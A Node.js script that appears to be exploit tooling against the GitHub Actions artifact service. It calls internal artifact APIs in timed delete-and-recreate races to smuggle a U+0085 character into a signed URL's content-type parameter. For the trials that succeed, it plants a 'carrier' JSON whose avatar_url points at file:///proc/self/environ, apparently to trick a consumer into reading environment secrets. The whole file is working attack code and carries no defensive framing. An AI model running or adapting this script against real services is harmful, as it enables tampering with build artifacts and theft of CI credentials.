import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"delete-recreate"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const winners = [];

async function create(name, version) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version,
      mimeType: StringValue.create({value: version === 7 ? 'application/json' : odd}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function upload(url, bytes = placeholder) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function del(name) {
  try {
    const value = await client.DeleteArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: Boolean(value.ok)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, rsct: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function putCarrier(urls, id) {
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  const bytes = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette delete/recreate carrier',
    stargazers_count: 0,
  }));
  await Promise.all(urls.filter(Boolean).map(url => upload(url, bytes).catch(() => false)));
  return repository;
}

async function pendingTrial(index, firstVersion) {
  const name = `pending-${process.env.GITHUB_RUN_ID}-${firstVersion}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const deleted = await del(name);
  const second = await create(name, firstVersion === 7 ? 6 : 7);
  await upload(second.url);
  const final = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'pending', index, firstVersion, first, deleted, second, final, view};
  if (view.rsct?.includes('\u0085') && final.id) {
    row.repository = await putCarrier([first.url, second.url], final.id);
    winners.push({kind: row.kind, index, firstVersion, id: final.id,
      rsct: view.rsct, repository: row.repository});
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

async function finalizedTrial(index, firstVersion, delay) {
  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 30}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const oldFinal = await finalize(name);
  let deletePromise;
  let createPromise;
  if (delay < 0) {
    deletePromise = del(name);
    await sleep(-delay);
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
  } else {
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
    await sleep(delay);
    deletePromise = del(name);
  }
  const [deleted, second] = await Promise.all([deletePromise, createPromise]);
  await upload(second.url);
  const final = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'finalized', index, firstVersion, delay, first, oldFinal, deleted, second, final, view};
  if (view.rsct?.includes('\u0085') && (final.id || oldFinal.id)) {
    const id = final.id || oldFinal.id;
    row.repository = await putCarrier([first.url, second.url], id);
    winners.push({kind: row.kind, index, firstVersion, delay, id,
      rsct: view.rsct, repository: row.repository});
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

const trials = [];
for (let i = 0; i < 8; i++) {
  trials.push(() => pendingTrial(i, i % 2 ? 7 : 6));
  for (const delay of [-20, 0, 20]) {
    trials.push(() => finalizedTrial(i, i % 2 ? 7 : 6, delay));
  }
}
const rows = [];
for (let i = 0; i < trials.length; i += 8) {
  rows.push(...await Promise.all(trials.slice(i, i + 8).map(fn => fn())));
}
const summary = {
  total: rows.length,
  odd: rows.filter(x => x.view?.rsct?.includes('\u0085')).length,
  json: rows.filter(x => x.view?.rsct === 'application/json').length,
  zip: rows.filter(x => x.view?.rsct === 'application/zip').length,
  missing: rows.filter(x => !x.view?.ok).length,
  pending: rows.filter(x => x.kind === 'pending').map(x => ({
    firstVersion: x.firstVersion, deleted: x.deleted, second: x.second, final: x.final, view: x.view,
  })),
};
console.log(`DELETE_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
}, null, 2) + '\n');
